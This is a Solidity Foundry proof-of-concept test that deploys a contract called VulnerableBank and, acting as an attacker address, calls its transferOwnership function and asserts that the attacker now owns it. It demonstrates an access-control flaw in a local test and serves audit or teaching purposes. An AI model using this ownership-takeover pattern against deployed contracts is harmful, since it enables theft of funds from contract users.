// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public virtual {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        // Step 2: Simulate an exploiter taking over the contract's owner
        vm.prank(attacker);
        target.transferOwnership(attacker);

        // Assertions to verify the attack was successful
        assertEq(target.owner(), attacker, "Attack failed: ownership not transferred");
    }
}